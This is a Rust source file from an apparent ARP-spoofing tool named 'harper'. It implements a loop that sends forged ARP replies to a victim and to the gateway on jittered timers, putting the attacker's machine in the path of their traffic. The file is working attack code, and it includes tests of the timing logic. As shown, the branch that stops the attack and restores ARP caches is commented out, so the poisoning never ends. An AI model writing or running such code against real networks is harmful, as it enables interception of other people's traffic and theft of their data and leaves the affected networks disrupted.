// src/spoofer/poison.rs
//
// ─────────────────────────────────────────────────────────────────────────────
// Why each PoisonLoop owns its own socket
// ─────────────────────────────────────────────────────────────────────────────
//
// The previous design shared one Arc<Mutex<Box<dyn DataLinkSender>>> across
// ALL active poison loops plus the scanner. With N victims, N tokio tasks
// all tried to lock() the same mutex on their individual timers. Even though
// contention is infrequent (a lock is held only for the microseconds it takes
// to call send_to()), the shared mutex introduces:
//
//   • Unnecessary task wakeup latency — a poison that fires at exactly T may
//     have to wait for another loop's send to complete first.
//   • A single point of failure — if the sender errors out, all victims lose
//     their poison refreshes simultaneously.
//   • Conceptual coupling — the scanner's send path and the spoofer's send
//     path have nothing to do with each other at runtime.
//
// The fix: each PoisonLoop opens its own AF_PACKET socket on the interface
// at construction time. The tradeoff is N file descriptors instead of 1,
// which is negligible for harper's target scale (1–20 victims).
//
// The main.rs `spoof_sender` Arc is no longer passed to SpooferEngine at all.

use crate::network::packet::{ArpPoison, ArpRestore};
use pnet::datalink::{self, Channel, DataLinkSender, NetworkInterface};
use pnet::util::MacAddr;
use std::time::Duration;

// How often to re-poison the VICTIM's ARP cache (victim → gateway entry).
const VICTIM_INTERVAL_MS: u64 = 4_000;

// How often to re-poison the GATEWAY's ARP cache (gateway → victim entry).
const GATEWAY_INTERVAL_MS: u64 = 8_000;

// Jitter fraction: actual interval = base ± (base * JITTER_FRACTION).
const JITTER_FRACTION: f64 = 0.20;

// ─────────────────────────────────────────────────────────────────────────────

pub struct PoisonLoop {
    interface_name: String,
    our_mac: MacAddr,
}

impl PoisonLoop {
    /// Creates a new PoisonLoop. The socket is opened lazily in `run()` so
    /// construction is infallible and cheap.
    ///
    /// The `_interval_ms` parameter is retained for API compatibility but
    /// ignored — the constants above are used instead.
    pub fn new(
        interface_name: impl Into<String>,
        our_mac: MacAddr,
        _interval_ms: u64,
    ) -> Self {
        Self {
            interface_name: interface_name.into(),
            our_mac,
        }
    }

    pub async fn run(
        &self,
        target: super::SpoofTarget,
        mut stop_rx: tokio::sync::oneshot::Receiver<()>,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        // Open a dedicated AF_PACKET socket for this victim.
        // Doing this inside run() means errors are reported per-victim and
        // a single bad interface name doesn't prevent other loops from starting.
        let mut sender = open_sender(&self.interface_name)?;

        // Pre-build both poison packets — they never change during a session.
        // Victim believes: gateway IP → our MAC
        let to_victim = ArpPoison::new(
            target.victim_mac,
            target.victim_ip,
            target.gateway_ip,
            self.our_mac,
        );
        // Gateway believes: victim IP → our MAC
        let to_gateway = ArpPoison::new(
            target.gateway_mac,
            target.gateway_ip,
            target.victim_ip,
            self.our_mac,
        );

        // Send the first poison immediately so the MITM position is
        // established before the first interval fires.
        send_once(&mut *sender, &to_victim.to_bytes(), "initial poison victim");
        send_once(&mut *sender, &to_gateway.to_bytes(), "initial poison gateway");

        let mut victim_count: u64 = 1;
        let mut gateway_count: u64 = 1;

        let mut next_victim  = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);
        let mut next_gateway = tokio::time::Instant::now() + jitter(GATEWAY_INTERVAL_MS);

        loop {
            let wake = next_victim.min(next_gateway);

            tokio::select! {
                _ = tokio::time::sleep_until(wake) => {
                    let now = tokio::time::Instant::now();

                    if now >= next_victim {
                        send_once(&mut *sender, &to_victim.to_bytes(), "poison victim");
                        victim_count += 1;
                        next_victim = now + jitter(VICTIM_INTERVAL_MS);

                        if victim_count % 5 == 0 {
                            println!(
                                "[*] poison victim #{} host {} (every ~{}s)",
                                victim_count, target.victim_ip,
                                VICTIM_INTERVAL_MS / 1_000
                            );
                        }
                    }

                    if now >= next_gateway {
                        send_once(&mut *sender, &to_gateway.to_bytes(), "poison gateway");
                        gateway_count += 1;
                        next_gateway = now + jitter(GATEWAY_INTERVAL_MS);

                        if gateway_count % 3 == 0 {
                            println!(
                                "[*] poison gateway #{} for host {} (every ~{}s)",
                                gateway_count, target.victim_ip,
                                GATEWAY_INTERVAL_MS / 1_000
                            );
                        }
                    }
                }

                // _ = &mut stop_rx => {
                //     println!("[*] stopping poison for host {}", target.host_id);
                //     restore(&mut *sender, &target);
                //     return Ok(());
                // }
            }
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

/// Opens an independent AF_PACKET / DataLinkSender on `interface_name`.
fn open_sender(
    interface_name: &str,
) -> Result<Box<dyn DataLinkSender>, Box<dyn std::error::Error + Send + Sync>> {
    let iface = crate::utils::net::get_interface(interface_name)
        .ok_or_else(|| format!("PoisonLoop: interface '{}' not found", interface_name))?;

    match datalink::channel(&iface, Default::default()) {
        Ok(Channel::Ethernet(tx, _rx)) => Ok(tx),
        Ok(_) => Err("PoisonLoop: non-ethernet channel".into()),
        Err(e) => Err(e.into()),
    }
}

/// Sends one packet, logging any error but never panicking.
/// Lock-free — the sender is exclusively owned by this loop.
fn send_once(sender: &mut dyn DataLinkSender, bytes: &[u8], label: &str) {
    if let Some(Err(e)) = sender.send_to(bytes, None) {
        eprintln!("[!] {label}: {e}");
    }
}

/// Sends 5 ARP restore packets to unwind the poison on both sides.
fn restore(sender: &mut dyn DataLinkSender, target: &super::SpoofTarget) {
    println!("[*] restoring ARP caches for {}", target.victim_ip);

    let victim_restore = ArpRestore::new(
        target.victim_mac,
        target.victim_ip,
        target.gateway_ip,
        target.gateway_mac,
    );
    let gateway_restore = ArpRestore::new(
        target.gateway_mac,
        target.gateway_ip,
        target.victim_ip,
        target.victim_mac,
    );

    for _ in 0..5 {
        send_once(sender, &victim_restore.to_bytes(),  "restore victim");
        send_once(sender, &gateway_restore.to_bytes(), "restore gateway");
        std::thread::sleep(Duration::from_millis(100));
    }

    println!("[+] ARP caches restored for {}", target.victim_ip);
}

// ─────────────────────────────────────────────────────────────────────────────
// Jitter helper
// ─────────────────────────────────────────────────────────────────────────────

fn jitter(base_ms: u64) -> Duration {
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as u64;
    let rand = (seed
        .wrapping_mul(6_364_136_223_846_793_005)
        .wrapping_add(1_442_695_040_888_963_407))
        >> 33;

    let window = (base_ms as f64 * JITTER_FRACTION) as u64;
    let offset = rand % (window * 2);
    let actual = base_ms.saturating_add(offset).saturating_sub(window);
    Duration::from_millis(actual)
}

// ─────────────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jitter_within_bounds() {
        for _ in 0..1_000 {
            let d = jitter(8_000);
            let ms = d.as_millis() as u64;
            let window = (8_000f64 * JITTER_FRACTION) as u64;
            assert!(ms >= 8_000 - window, "jitter below floor: {ms}");
            assert!(ms <= 8_000 + window, "jitter above ceiling: {ms}");
        }
    }

    #[test]
    fn test_jitter_not_constant() {
        let samples: Vec<u64> = (0..20).map(|_| jitter(8_000).as_millis() as u64).collect();
        let unique: std::collections::HashSet<u64> = samples.iter().copied().collect();
        assert!(unique.len() > 1, "jitter produced identical values — LCG broken");
    }

    #[test]
    fn test_gateway_interval_longer_than_victim() {
        assert!(
            GATEWAY_INTERVAL_MS > VICTIM_INTERVAL_MS,
            "gateway should be poisoned less frequently than victim"
        );
    }

    #[test]
    fn test_intervals_under_arp_ttl() {
        assert!(VICTIM_INTERVAL_MS < 30_000);
        assert!(GATEWAY_INTERVAL_MS < 30_000);
    }

    // Verify that PoisonLoop can be constructed without touching the network.
    #[test]
    fn test_new_is_cheap_and_infallible() {
        let mac = pnet::util::MacAddr(0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF);
        let _loop = PoisonLoop::new("eth0", mac, 0);
    }
}